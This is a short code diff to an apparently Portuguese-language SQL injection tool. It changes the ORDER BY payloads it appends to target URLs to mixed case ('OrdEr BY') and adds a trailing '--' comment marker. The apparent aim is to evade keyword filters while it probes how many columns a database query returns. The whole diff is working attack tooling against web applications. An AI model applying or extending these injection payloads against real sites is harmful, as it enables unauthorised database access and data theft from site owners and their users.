@@ -72,7 +72,7 @@ sql_errors1 = ['Convo Not found!','rowCount()', 'RecordCount()', 'ERROR:', 'Warn
         
     }
     async function BuscaIDColunas(url) {
-        url = url + '+ORDER+BY+';
+        url = url + '+OrdEr+BY+';
         console.log("Localizando Quantidade de Colulas")
         return new Promise(async function(resolve, reject){
             try {
@@ -242,10 +242,7 @@ class sqlinode {
             const oQueryParams =  parse(url, true);
 
             console.log("querys:" , oQueryParams.query)
-            // if (url.indexOf('&') > -1 ) {
-            //     url = url.replace('&','+ORDER+BY+1000&')
-            // }
-            url = url+'+ORDER+BY+1000'
+            url = url+'+OrdEr+BY+1000--'
             console.log("Injetando URL:", url)
             //aguarda um minuto de timeout
             var timeOut = setTimeout(function(){
